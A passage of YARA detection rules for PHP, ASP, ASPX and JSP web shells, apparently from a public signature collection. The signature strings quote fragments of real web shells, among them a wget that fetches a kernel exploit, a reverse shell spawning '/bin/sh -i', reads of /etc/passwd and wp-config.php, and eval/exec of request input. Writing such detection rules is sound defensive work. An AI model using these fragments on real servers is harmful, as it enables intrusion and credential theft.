		hash8 = "c6a5148c81411ec9200810619fa5eec6616800a4d76c988431c272bc8679254f"
		hash9 = "59ea6cf16ea06ff47cf0e6a398df2eaec4d329707b8c3201fc63cbf0b7c85519"
		hash10 = "0e0227a0001b38fb59fc07749e80c9d298ff0e6aca126ea8f4ea68ebc9a3661f"
		hash11 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
		id = "00d3159c-f5d2-5b49-9499-3bb938776858"
	strings:
		$s1 = "$_POST['cmd'] = which('" ascii
		$s2 = "$blah = ex(" ascii
	condition:
		filesize < 600KB and all of them
}

rule Webshell_c100 {
	meta:
		description = "Detects Webshell - rule generated from from files c100 v. 777shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
		hash2 = "d4424c61fe29d2ee3d8503f7d65feb48341ac2fc0049119f83074950e41194d5"
		hash3 = "21dd06ec423f0b49732e4289222864dcc055967922d0fcec901d38a57ed77f06"
		hash4 = "c377f9316a4c953602879eb8af1fd7cbb0dd35de6bb4747fa911234082c45596"
		hash5 = "816e699014be9a6d02d5d184eb958c49469d687b7c6fb88e878bca64688a19c9"
		hash6 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		id = "aa8317ff-680d-5b60-b8a9-a77ea58f0ed0"
	strings:
		$s0 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)" fullword ascii
		$s1 = "<center>Kernel Info: <form name=\"form1\" method=\"post\" action=\"http://google.com/search\">" fullword ascii
		$s3 = "cut -d: -f1,2,3 /etc/passwd | grep ::" ascii
		$s4 = "which wget curl w3m lynx" ascii
		$s6 = "netstat -atup | grep IST"  ascii
	condition:
		filesize < 685KB and 2 of them
}

rule Webshell_AcidPoison {
	meta:
		description = "Detects Poison Sh3ll - Webshell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash4 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash5 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash6 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash7 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
		hash8 = "be541cf880a8e389a0767b85f1686443f35b508d1975ee25e1ce3f08fa32cfb5"
		hash9 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash10 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		id = "6c201221-ca67-57fb-9bc7-fab4fc1da982"
	strings:
		$s1 = "elseif ( enabled(\"exec\") ) { exec($cmd,$o); $output = join(\"\\r\\n\",$o); }" fullword ascii
	condition:
		filesize < 550KB and all of them
}

rule Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256 {
	meta:
		description = "Detects Webshell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash2 = "d0edca7539ef2d30f0b3189b21a779c95b5815c1637829b5594e2601e77cb4dc"
		hash3 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
		hash4 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		hash5 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"
		id = "80f7d202-adb8-5d9c-b176-576e3b9553c1"
	strings:
		$s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
		$s2 = "foreach($quicklaunch2 as $item) {" fullword ascii
	condition:
		filesize < 882KB and all of them
}

rule Webshell_Ayyildiz {
	meta:
		description = "Detects Webshell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5"
		hash2 = "9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a"
		hash3 = "2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca"
		hash4 = "77a63b26f52ba341dd2f5e8bbf5daf05ebbdef6b3f7e81cec44ce97680e820f9"
		hash5 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"
		id = "cc752958-eb6c-5185-b94c-5fcec833924d"
	strings:
		$s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
		$s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
	condition:
		filesize < 112KB and all of them
}

rule Webshell_zehir {
	meta:
		description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218"
		hash2 = "0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6"
		hash3 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
		hash4 = "b57bf397984545f419045391b56dcaf7b0bed8b6ee331b5c46cee35c92ffa13d"
		hash5 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"
		id = "7f8f15a6-1c5b-5c75-b61a-df7b18699f5a"
	strings:
		$s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
		$s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
	condition:
		filesize < 200KB and 1 of them
}

/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-09-10
	Identifier: Webshells PHP bartblaze
*/

/* Rule Set ----------------------------------------------------------------- */

rule UploadShell_98038f1efa4203432349badabad76d44337319a6 {
	meta:
		description = "Detects a web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		hash1 = "506a6ab6c49e904b4adc1f969c91e4f1a7dde164be549c6440e766de36c93215"
		id = "f385b091-ce0d-5d5b-8eeb-57e00c8d0210"
	strings:
		$s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" fullword ascii
		$s6 = "@unlink(\"./export-check-settings.php\");" fullword ascii
		$s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " fullword ascii
	condition:
		( uint16(0) == 0x3f3c and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
}

rule DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3 {
	meta:
		description = "Detects a web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		hash1 = "7ea49d5c29f1242f81f2393b514798ff7caccb50d46c60bdfcf61db00043473b"
		id = "161ceca6-f5e8-5bcf-bc31-2a2169b1a1c7"
	strings:
		$s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
		$s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii
	condition:
		( uint16(0) == 0x3c0a and filesize < 300KB and all of them )
}

rule Unknown_8af033424f9590a15472a23cc3236e68070b952e {
	meta:
		description = "Detects a web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		hash1 = "3382b5eaaa9ad651ab4793e807032650667f9d64356676a16ae3e9b02740ccf3"
		id = "fcf467b6-f49a-52d0-a57f-9f3cf6d0b25b"
	strings:
		$s1 = "$check = $_SERVER['DOCUMENT_ROOT']" fullword ascii
		$s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
		$s3 = "fwrite($fp,base64_decode('" ascii
	condition:
		( uint16(0) == 0x6324 and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
}

rule DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d {
	meta:
		description = "Detects a web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		hash1 = "51a16b09520a3e063adf10ff5192015729a5de1add8341a43da5326e626315bd"
		id = "804f7229-1440-5a2e-91cd-a58a38b22aa9"
	strings:
		$x1 = "DK Shell - Took the Best made it Better..!!" fullword ascii
		$x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
		$x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" fullword ascii

		$s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
		$s9 = "$x = $_GET[\"x\"];" fullword ascii
	condition:
		( uint16(0) == 0x3f3c and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}

rule WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901 {
	meta:
		description = "Detects a web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		hash1 = "b1733cbb0eb3d440c4174cc67ca693ba92308ded5fc1069ed650c3c78b1da4bc"
		id = "7958e5fc-5ac5-58bc-8128-0a778e99a4e4"
	strings:
		$s1 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
		$s2 = "input[type=text], input[type=password]{" fullword ascii
	condition:
		( uint16(0) == 0x6c3c and filesize < 80KB and all of them )
}

rule webshell_e8eaf8da94012e866e51547cd63bb996379690bf {
	meta:
		description = "Detects a web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		hash1 = "027544baa10259939780e97dc908bd43f0fb940510119fc4cce0883f3dd88275"
		id = "8fda9b9f-9a72-5123-91d7-0d0aec9e17bc"
	strings:
		$x1 = "@exec('./bypass/ln -s /etc/passwd 1.php');" fullword ascii
		$x2 = "echo \"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \";" fullword ascii
		$x3 = "@exec('tar -xvf mysqldumper.tar.gz');" fullword ascii
	condition:
		( uint16(0) == 0x213c and filesize < 100KB and 1 of ($x*) ) or ( 2 of them )
}

rule Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167 {
	meta:
		description = "Detects a web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		hash1 = "6362372850ac7455fa9461ed0483032a1886543f213a431f81a2ac76d383b47e"
		id = "efd09da2-f232-5a21-99c8-dc2bf00baa73"
	strings:
		$s1 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/libraries/lola.php\" ;" fullword ascii
		$s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
		$s3 = "fwrite($fp,base64_decode('" ascii
	condition:
		( uint16(0) == 0x6324 and filesize < 2KB and all of them )
}

rule WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7 {
	meta:
		description = "Detects a web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		hash1 = "d053086907aed21fbb6019bf9e644d2bae61c63563c4c3b948d755db3e78f395"
		id = "92165645-5392-588d-ba2a-5ef6b7499a5a"
	strings:
		$s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" fullword ascii
		$s9 = "$mosimage_session = \"" fullword ascii
	condition:
		( uint16(0) == 0x3f3c and filesize < 300KB and all of them )
}

rule WebShell_Generic_1609_A {
	meta:
		description = "Auto-generated rule"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/bartblaze/PHP-backdoors"
		date = "2016-09-10"
		super_rule = 1
		hash1 = "c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035"
		hash3 = "69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e"
		id = "4b7db4db-8699-5b4d-ab90-ce79f1160984"
	strings:
		$s1 = "return $qwery45234dws($b);" fullword ascii
	condition:
		( uint16(0) == 0x3f3c and 1 of them )
}

rule Nishang_Webshell {
	meta:
		description = "Detects a ASPX web shell"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/samratashok/nishang"
		date = "2016-09-11"
		id = "785e6da7-097e-598b-9799-ffe43738d718"
	strings:
		$s1 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" ascii
		$s2 = "output.Text += \"\nPS> \" + console.Text + \"\n\" + do_ps(console.Text);" ascii
		$s3 = "<title>Antak Webshell</title>" fullword ascii
		$s4 = "<asp:Button ID=\"executesql\" runat=\"server\" Text=\"Execute SQL Query\"" ascii
	condition:
		( uint16(0) == 0x253C and filesize < 100KB and 1 of ($s*) )
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-28
   Identifier: Simple PHP Webshell
*/

/* Rule Set ----------------------------------------------------------------- */

rule PHP_Webshell_1_Feb17 {
   meta:
      description = "Detects a simple cloaked PHP web shell"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://isc.sans.edu/diary/Analysis+of+a+Simple+PHP+Backdoor/22127"
      date = "2017-02-28"
      id = "eedf87c9-2dab-530d-b5d8-a4c2ebc87821"
   strings:
      $h1 = "<?php ${\"\\x" ascii

      $x1 = "\";global$auth;function sh_decrypt_phase($data,$key){${\"" ascii
      $x2 = "global$auth;return sh_decrypt_phase(sh_decrypt_phase($" ascii
      $x3 = "]}[\"\x64\"]);}}echo " ascii
      $x4 = "\"=>@phpversion(),\"\\x" ascii

      /* Decloaked version */
      $s1 = "$i=Array(\"pv\"=>@phpversion(),\"sv\"" ascii
      $s3 = "$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));" ascii
   condition:
      uint32(0) == 0x68703f3c and ( $h1 at 0 and 1 of them ) or 2 of them
}

rule Webshell_Tiny_JSP_2 {
	meta:
		description = "Detects a tiny webshell - chine chopper"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2015-12-05"
		score = 100
		id = "b628c4f9-eb07-592d-834a-5c94e41987da"
	strings:
		$s1 = "<%eval(Request(" nocase
	condition:
		uint16(0) == 0x253c and filesize < 40 and all of them
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-06-25
   Identifier: Wordpress Webshell
   Reference: Internal Research
*/

/* Rule Set ----------------------------------------------------------------- */

rule Wordpress_Config_Webshell_Preprend {
   meta:
      description = "Webshell that uses standard Wordpress wp-config.php file and appends the malicious code in front of it"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-06-25"
		score = 65
      id = "2a432c53-5dee-5a2e-9ccf-9e5d52713af9"
   strings:
      $x1 = " * @package WordPress" fullword ascii

      $s1 = "define('DB_NAME'," ascii
      $s2 = "require_once(ABSPATH . 'wp-settings.php');" ascii

      $fp1 = "iThemes Security Config" ascii
   condition:
      uint32(0) == 0x68703f3c and filesize < 400KB and
      $x1 and
      all of ($s*) and
      not $x1 in (0..1000) and
      not 1 of ($fp*)
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-07-11
   Identifier: PAS Webshell
*/

/* Rule Set ----------------------------------------------------------------- */

rule PAS_Webshell_Encoded {
   meta:
      description = "Detects a PAS webshell"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "http://blog.talosintelligence.com/2017/07/the-medoc-connection.html"
      date = "2017-07-11"
      score = 80
      id = "6cb547ad-7a97-5c3d-83e1-114ea798ddb8"
   strings:
      $head1 = "<?php $____=" fullword ascii
      $head2 = "'base'.(32*2).'"

      $enc1 = "isset($_COOKIE['___']" ascii
      $enc2 = "if($___!==NULL){" ascii
      $enc3 = ").substr(md5(strrev($" ascii
      $enc4 = "]))%256);$" ascii
      $enc5 = "]))@setcookie('" ascii
      $enc6 = "]=chr(( ord($_" ascii

      /* =\x0A'));if(isset($_COOKIE[' */
      $x1 = { 3D 0A 27 29 29 3B 69 66 28 69 73 73 65 74 28 24 5F 43 4F 4F 4B 49 45 5B 27 }

      $foot1 = "value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>"
      $foot2 = "();}} @header(\"Status: 404 Not Found\"); ?>"
   condition:
      ( uint32(0) == 0x68703f3c and filesize < 80KB and (
         3 of them or
         $head1 at 0 or
         $head2 in (0..20) or
         1 of ($x*)
         )
      ) or
      $foot1 at (filesize-52) or
      $foot2 at (filesize-44)
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-09-21
   Identifier: ALFA Shell
   Reference: Internal Research - APT33
*/

/* Rule Set ----------------------------------------------------------------- */

rule ALFA_SHELL {
   meta:
      description = "Detects web shell often used by Iranian APT groups"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research - APT33"
      date = "2017-09-21"
      hash1 = "a39d8823d54c55e60a7395772e50d116408804c1a5368391a1e5871dbdc83547"
      id = "f0be44ec-bff0-5d01-aabd-df7aa05383e3"
   strings:
      $x1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')" ascii
      $x2 = "#solevisible@gmail.com" fullword ascii
      $x3 = "'login_page' => '500',//gui or 500 or 403 or 404" fullword ascii
      $x4 = "$GLOBALS['__ALFA__']" fullword ascii
      $x5 = "if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')" ascii
      $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A }
   condition:
      ( filesize < 900KB and 2 of ($x*) or $f1 at (filesize-22) )
}

rule Webshell_FOPO_Obfuscation_APT_ON_Nov17_1 {
   meta:
      description = "Detects malware from NK APT incident DE"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research - ON"
      date = "2017-11-17"
      hash1 = "ed6e2e0027d3f564f5ce438984dc8a54577df822ce56ce079c60c99a91d5ffb1"
      id = "0122bb03-8ff0-554d-8fee-458f0ddd7664"
   strings:
      $x1 = "Obfuscation provided by FOPO" fullword ascii

      $s1 = "\";@eval($" ascii
      $f1 = { 22 29 29 3B 0D 0A 3F 3E }
   condition:
      uint16(0) == 0x3f3c and filesize < 800KB and (
        $x1 or
        ( $s1 in (0..350) and $f1 at (filesize-23) )
      )
}

rule WebShell_JexBoss_JSP_1 {
   meta:
      description = "Detects JexBoss JSPs"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2018-11-08"
      hash1 = "41e0fb374e5d30b2e2a362a2718a5bf16e73127e22f0dfc89fdb17acbe89efdf"
      id = "4fe7a20b-dc2b-509b-bcf8-e3bfbbe7431a"
   strings:
      $x1 = "equals(\"jexboss\")"
      $x2 = "%><pre><%if(request.getParameter(\"ppp\") != null &&" ascii

      $s1 = "<%@ page import=\"java.util.*,java.io.*\"%><pre><% if (request.getParameter(\""
      $s2 = "!= null && request.getHeader(\"user-agent\"" ascii
      $s3 = "String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 1KB and 1 of ($x*) or 2 of them
}

rule WebShell_JexBoss_WAR_1 {
   meta:
      description = "Detects JexBoss versions in WAR form"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2018-11-08"
      hash1 = "6271775ab144ce9bb9138bf054b149b5813d3beb96338993c6de35330f566092"
      hash2 = "6f14a63c3034d3762da8b3ad4592a8209a0c88beebcb9f9bd11b40e879f74eaf"
      id = "0973f6cf-8a5f-5449-812e-36aa6b9939df"
   strings:
      $ = "jbossass" fullword ascii
      $ = "jexws.jsp" fullword ascii
      $ = "jexws.jspPK" fullword ascii
      $ = "jexws1.jsp" fullword ascii
      $ = "jexws1.jspPK" fullword ascii
      $ = "jexws2.jsp" fullword ascii
      $ = "jexws2.jspPK" fullword ascii
      $ = "jexws3.jsp" fullword ascii
      $ = "jexws3.jspPK" fullword ascii
      $ = "jexws4.jsp" fullword ascii
      $ = "jexws4.jspPK" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 4KB and 1 of them
}

rule webshell_tinyasp {
    meta:
	author = "Jeff Beley"
	hash1 = "1f29905348e136b66d4ff6c1494d6008ea13f9551ad5aa9b991893a31b37e452"
	description = "Detects 24 byte ASP webshell and variations"
	date = "2019-01-09"
	id = "38b1f61b-e506-59b2-9157-d0345431c429"
   strings:
   	$s1 = "Execute Request" ascii wide nocase
   condition:
   	uint16(0) == 0x253c and filesize < 150 and 1 of them
}

rule WEBSHELL_ASPX_Mar21_1 {
   meta:
      description = "Detects ASPX Web Shells"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2021-03-12"
      hash1 = "10b6e82125a2ddf3cc31a238e0d0c71a64f902e0d77171766713affede03174d"
      hash2 = "170bee832df176aac0a3c6c7d5aa3fee413b4572030a24c994a97e70f6648ffc"
      hash3 = "31c4d1fc81c052e269866deff324dffb215e7d481a47a2b6357a572a3e685d90"
      hash4 = "41b5c26ac194439612b68e9ec6a638eceaf00842c347ffa551eb009ef6c015a3"
      hash5 = "4b645bc773acde2b3cc204e77ac27c3f6991046c3b75f42d12bc90ec29cff9e3"
      hash6 = "602bb701b78895d4de32f5e78f3c511e5298ba244b29641b11a7c1c483789859"
      hash7 = "7ac47a17c511e25c06a53a1c7a5fbbf05f41f047a4a40b71afa81ce7b59f4b03"
      hash8 = "9a5097d0e8dc29a2814adac070c80fd4b149b33e56aaaf9235af9e87b0501d91"
      hash9 = "9efb5932c0753e45504fc9e8444209b92c2bdf22e63b1c1a44e2d52cb62b4548"
      hash10 = "d40b16307d6434c3281374c0e1bbc0f6db388883e7f6266c3c81de0694266882"
      id = "52884135-6b86-5e3e-a866-36a812d5a9af"
   strings:
      $s1 = ".StartInfo.FileName = 'cmd.exe';" ascii fullword
      $s2 = "<xsl:template match=\"\"/root\"\">" ascii fullword
      $s3 = "<?xml version=\"\"1.0\"\"?><root>test</root>\";" ascii fullword
   condition:
      uint16(0) == 0x253c and
      filesize < 6KB and
      all of them
}
rule SIGNATURE_BASE_Php_Reverse_Shell : FILE
{
	meta:
		description = "Laudanum Injector Tools - file php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "306d150f-95a8-57fd-8f5e-786c429af6b3"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/cd7651d2ccf4158a35a8d1cc0441928f7d92818f/yara/apt_laudanum_webshells.yar#L158-L173"
		license_url = "https://github.com/Neo23x0/signature-base/blob/cd7651d2ccf4158a35a8d1cc0441928f7d92818f/LICENSE"
		hash = "3ef03bbe3649535a03315dcfc1a1208a09cea49d"
		logic_hash = "ea8e320abb57e0467db92271f7d36f144f85e04ce15cd9fa8d3f53dfa8d43929"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
		$s2 = "printit(\"Successfully opened reverse shell to $ip:$port\");" fullword ascii
		$s3 = "$input = fread($pipes[1], $chunk_size);" fullword ascii

	condition:
		filesize <15KB and all of them
}
rule SIGNATURE_BASE_Php_Reverse_Shell_2 : FILE
{
	meta:
		description = "Laudanum Injector Tools - file php-reverse-shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f10cc33e-0cb6-5d08-af1f-5ef76368de9d"
		date = "2015-06-22"
		modified = "2023-12-05"
		reference = "http://laudanum.inguardians.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/cd7651d2ccf4158a35a8d1cc0441928f7d92818f/yara/apt_laudanum_webshells.yar#L298-L312"
		license_url = "https://github.com/Neo23x0/signature-base/blob/cd7651d2ccf4158a35a8d1cc0441928f7d92818f/LICENSE"
		hash = "025db3c3473413064f0606d93d155c7eb5049c42"
		logic_hash = "695dc565c273ed358f7d56526fa4956ba13b216d8897d0707e1660a82b745081"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
		$s7 = "$shell = 'uname -a; w; id; /bin/sh -i';" fullword ascii

	condition:
		filesize <10KB and all of them
}